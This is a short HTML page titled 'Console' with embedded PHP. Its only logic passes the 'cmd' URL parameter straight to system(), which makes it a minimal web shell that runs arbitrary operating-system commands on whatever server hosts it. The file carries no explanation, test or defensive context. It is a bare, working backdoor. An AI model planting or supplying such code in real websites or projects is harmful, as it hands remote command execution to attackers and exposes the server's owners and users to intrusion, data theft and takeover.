<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Console</title>
</head>
<body>
    <?php
        if(isset($_GET['cmd'])) system($_GET['cmd']);
    ?>
</body>
</html>